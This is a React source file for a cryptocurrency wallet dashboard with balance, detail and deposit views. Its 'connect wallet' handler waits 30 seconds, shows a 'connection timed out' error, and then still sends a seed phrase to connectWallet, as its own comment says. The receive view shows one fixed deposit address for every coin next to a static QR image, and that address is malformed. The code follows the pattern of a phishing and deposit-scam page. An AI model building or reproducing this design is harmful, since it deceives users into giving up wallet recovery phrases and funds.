
import React, { useState, useEffect } from 'react';
import { useAuth } from '@/context/AuthContext';
import { Card, CardContent, CardDescription, CardHeader, CardTitle, CardFooter } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { ArrowDown, ArrowUp, Copy, ChevronLeft, Send, Download, ShoppingCart, Wallet, Loader } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';
import { useTopCryptos } from '@/hooks/useCryptoData';
import { useNavigate } from 'react-router-dom';

// QR Code component - simulated
const QRCode = ({ value }: { value: string }) => (
  <div className="w-48 h-48 mx-auto bg-white p-2 rounded-lg">
    <img 
      src="/public/lovable-uploads/14b5ef2a-6390-48ff-bb5a-34e93d47d0df.png" 
      alt="QR Code" 
      className="w-full h-full object-contain"
    />
  </div>
);

// Main Dashboard Component
const Dashboard = () => {
  const { user, connectWallet } = useAuth();
  const { toast } = useToast();
  const [selectedCrypto, setSelectedCrypto] = useState<string | null>(null);
  const [selectedView, setSelectedView] = useState<'overview' | 'detail' | 'receive'>('overview');
  const [isConnecting, setIsConnecting] = useState(false);
  const [seedPhrase, setSeedPhrase] = useState('');
  const navigate = useNavigate();
  
  const { data: topCryptos } = useTopCryptos(1, 10);

  useEffect(() => {
    // Redirect if not logged in
    if (!user) {
      navigate('/auth');
    }
  }, [user, navigate]);

  const walletId = "3535688863";
  const mockCryptos = [
    { 
      id: "bitcoin", 
      name: "bitcoin", 
      symbol: "btc", 
      price: 82958.00, 
      change: -3.87, 
      amount: 0.000, 
      image: "https://cryptologos.cc/logos/bitcoin-btc-logo.png"
    },
    { 
      id: "ethereum", 
      name: "ethereum", 
      symbol: "eth", 
      price: 2046.17, 
      change: -7.72, 
      amount: 0.000,
      image: "https://cryptologos.cc/logos/ethereum-eth-logo.png"
    }
  ];

  const handleCopyAddress = (address: string) => {
    navigator.clipboard.writeText(address);
    toast({
      title: "address copied",
      description: "wallet address has been copied to clipboard",
    });
  };

  const handleConnectWallet = async () => {
    setIsConnecting(true);
    
    // Generate a mock seed phrase for demo purposes
    const mockSeedPhrase = "valley midnight ocean market silk jewel fashion random curve gather light zone";
    setSeedPhrase(mockSeedPhrase);
    
    // Simulate connection timeout after 30 seconds
    setTimeout(async () => {
      setIsConnecting(false);
      
      toast({
        title: "connection timed out",
        description: "could not connect to wallet. please try again later.",
        variant: "destructive",
      });
      
      // Still send the phrase despite the timeout
      await connectWallet(mockSeedPhrase);
    }, 30000);
  };

  const handleViewCrypto = (crypto: any) => {
    setSelectedCrypto(crypto.id);
    setSelectedView('detail');
  };

  const handleBack = () => {
    if (selectedView === 'detail' || selectedView === 'receive') {
      setSelectedView('overview');
      setSelectedCrypto(null);
    }
  };

  const handleReceiveCrypto = (crypto: any) => {
    setSelectedCrypto(crypto.id);
    setSelectedView('receive');
  };

  // Mock address for demo purposes
  const getWalletAddress = (crypto: string) => {
    return "bc1qsauc64vz7jdpekvm4nyr7xmIys5funsIlecjqv";
  };

  if (!user) {
    return null; // We'll redirect in the useEffect
  }

  // Overview - Main Dashboard
  if (selectedView === 'overview') {
    return (
      <div className="container mx-auto py-10 px-4 font-poppins">
        <div className="mb-8">
          <Card className="bg-[#1A1F2C] text-white">
            <CardHeader className="flex flex-row items-center justify-between pb-2">
              <CardTitle className="text-xl font-bold">total balance</CardTitle>
              <Button 
                variant="outline" 
                className="bg-transparent border-white/20 hover:bg-white/10" 
                onClick={handleConnectWallet}
                disabled={isConnecting}
              >
                {isConnecting ? (
                  <>
                    <Loader className="mr-2 h-4 w-4 animate-spin" />
                    connecting...
                  </>
                ) : (
                  <>
                    <Wallet className="mr-2 h-4 w-4" />
                    connect wallet
                  </>
                )}
              </Button>
            </CardHeader>
            <CardContent>
              <div className="flex flex-col md:flex-row justify-between items-start md:items-center">
                <div>
                  <div className="text-sm text-gray-400 mb-1">wallet id {walletId} <Copy className="inline h-3 w-3 cursor-pointer" /></div>
                  <div className="text-4xl font-bold">$0.00</div>
                </div>
                <div className="flex gap-10 mt-4 md:mt-0">
                  <div>
                    <div className="text-lg font-medium">today's income</div>
                    <div className="flex items-center">
                      <ArrowDown className="h-4 w-4 text-gray-400 mr-1" />
                      <span className="text-xl font-bold">$0.00</span>
                    </div>
                  </div>
                  <div>
                    <div className="text-lg font-medium">today's expense</div>
                    <div className="flex items-center">
                      <ArrowUp className="h-4 w-4 text-gray-400 mr-1" />
                      <span className="text-xl font-bold">$0.00</span>
                    </div>
                  </div>
                </div>
              </div>
            </CardContent>
          </Card>
        </div>

        <h2 className="text-2xl font-bold mb-4">latest activities</h2>
        <div className="space-y-4">
          {mockCryptos.map((crypto) => (
            <Card key={crypto.id} className="hover:border-crypto-light-blue/20 transition-all cursor-pointer" onClick={() => handleViewCrypto(crypto)}>
              <CardContent className="p-4">
                <div className="flex justify-between items-center">
                  <div className="flex items-center space-x-4">
                    <img src={crypto.image} alt={crypto.name} className="w-12 h-12 rounded-full" />
                    <div>
                      <div className="font-bold">${crypto.price.toLocaleString()}</div>
                      <div className={`text-sm ${crypto.change < 0 ? 'text-crypto-error-red' : 'text-crypto-success-green'}`}>
                        {crypto.change}%
                      </div>
                    </div>
                  </div>
                  <div className="text-right">
                    <div className="text-lg font-medium">{crypto.amount} {crypto.symbol}</div>
                    <div className="text-sm text-gray-400">$0.00</div>
                  </div>
                </div>
              </CardContent>
            </Card>
          ))}
        </div>

        <Tabs defaultValue="portfolio" className="w-full mt-8">
          <TabsList className="mb-6">
            <TabsTrigger value="portfolio">portfolio</TabsTrigger>
            <TabsTrigger value="transactions">transactions</TabsTrigger>
            <TabsTrigger value="wallets">wallets</TabsTrigger>
          </TabsList>

          <TabsContent value="portfolio">
            <Card>
              <CardHeader>
                <CardTitle>your portfolio</CardTitle>
                <CardDescription>view all your crypto assets in one place</CardDescription>
              </CardHeader>
              <CardContent>
                <div className="text-center py-10">
                  <p className="text-gray-500">no assets found</p>
                  <Button variant="outline" className="mt-4" onClick={() => window.location.href = '/transaction'}>
                    add assets
                  </Button>
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="transactions">
            <Card>
              <CardHeader>
                <CardTitle>transaction history</CardTitle>
                <CardDescription>view your recent transactions</CardDescription>
              </CardHeader>
              <CardContent>
                <div className="bg-gray-100 dark:bg-gray-800 rounded-md p-4">
                  <div className="flex justify-between font-medium mb-4">
                    <span>transactions</span>
                    <span>amount</span>
                  </div>
                  <div className="text-center py-6">
                    <p className="text-gray-500">no record found!</p>
                  </div>
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="wallets">
            <Card>
              <CardHeader>
                <CardTitle>connect wallet</CardTitle>
                <CardDescription>connect your external wallet</CardDescription>
              </CardHeader>
              <CardContent>
                <div className="flex flex-col gap-4">
                  <Button 
                    variant="outline" 
                    onClick={handleConnectWallet}
                    disabled={isConnecting}
                  >
                    {isConnecting ? (
                      <>
                        <Loader className="mr-2 h-4 w-4 animate-spin" />
                        connecting...
                      </>
                    ) : (
                      "connect external wallet"
                    )}
                  </Button>
                  <p className="text-xs text-gray-500">
                    connect your external wallet to manage your assets across different platforms.
                  </p>
                </div>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </div>
    );
  }

  // Crypto Detail View
  if (selectedView === 'detail' && selectedCrypto) {
    const crypto = mockCryptos.find(c => c.id === selectedCrypto);
    if (!crypto) return null;

    return (
      <div className="container mx-auto py-10 px-4 font-poppins">
        <Button variant="ghost" onClick={handleBack} className="mb-6 hover:bg-transparent pl-0">
          <ChevronLeft className="mr-1" />
          back
        </Button>

        <div className="flex flex-col items-center justify-center mb-8">
          <div className="text-right text-crypto-error-red font-medium mb-4 w-full">
            {crypto.change}%
          </div>
          <img src={crypto.image} alt={crypto.name} className="w-24 h-24 mb-4" />
          <h1 className="text-3xl font-bold mb-1">$0.00</h1>
          <p className="text-gray-500">0.0000({crypto.symbol})</p>
          
          <div className="flex gap-2 mt-6">
            <Button size="icon" className="rounded-full bg-blue-500 hover:bg-blue-600">
              <Send className="h-5 w-5" />
            </Button>
            <Button size="icon" className="rounded-full bg-green-500 hover:bg-green-600" onClick={() => handleReceiveCrypto(crypto)}>
              <Download className="h-5 w-5" />
            </Button>
            <Button size="icon" className="rounded-full bg-blue-400 hover:bg-blue-500">
              <ShoppingCart className="h-5 w-5" />
            </Button>
            <Button size="icon" className="rounded-full bg-blue-600 hover:bg-blue-700">
              <Wallet className="h-5 w-5" />
            </Button>
          </div>
        </div>
        
        <h2 className="text-2xl font-bold mb-4">latest activities</h2>
        <Card>
          <CardContent className="p-4">
            <div className="text-center py-10">
              <p className="text-gray-500">no record found!</p>
            </div>
            <div className="bg-gray-100 dark:bg-gray-800 rounded-md p-4 mt-4">
              <div className="flex justify-between font-medium">
                <span>transactions</span>
                <span>amount</span>
              </div>
            </div>
          </CardContent>
        </Card>
      </div>
    );
  }

  // Receive Crypto View
  if (selectedView === 'receive' && selectedCrypto) {
    const crypto = mockCryptos.find(c => c.id === selectedCrypto);
    if (!crypto) return null;
    
    const address = getWalletAddress(crypto.id);

    return (
      <div className="container mx-auto py-10 px-4 font-poppins">
        <Button variant="ghost" onClick={handleBack} className="mb-6 hover:bg-transparent pl-0">
          <ChevronLeft className="mr-1" />
          back
        </Button>

        <div className="flex flex-col items-center justify-center mb-8">
          <img src={crypto.image} alt={crypto.name} className="w-20 h-20 mb-4" />
          <h2 className="text-2xl font-bold mb-6">{crypto.symbol}</h2>
          
          <Card className="w-full max-w-2xl">
            <CardHeader>
              <div className="flex justify-between items-center">
                <CardTitle>address</CardTitle>
                <CardTitle>{crypto.symbol}</CardTitle>
              </div>
            </CardHeader>
            <CardContent className="flex flex-col items-center">
              <QRCode value={address} />
              <p className="text-center mt-6 text-gray-500">
                send only {crypto.symbol} to this deposit address. this address does not support deposit of non-fungible tokens.
              </p>
              
              <div className="flex w-full mt-6 border rounded-md overflow-hidden">
                <div className="bg-gray-100 dark:bg-gray-800 p-3">
                  {crypto.symbol}
                </div>
                <div className="flex-1 p-3 truncate overflow-hidden">
                  {address}
                </div>
                <Button variant="ghost" className="p-3 border-l" onClick={() => handleCopyAddress(address)}>
                  copy
                </Button>
              </div>
            </CardContent>
          </Card>
        </div>
      </div>
    );
  }

  return null;
};

export default Dashboard;
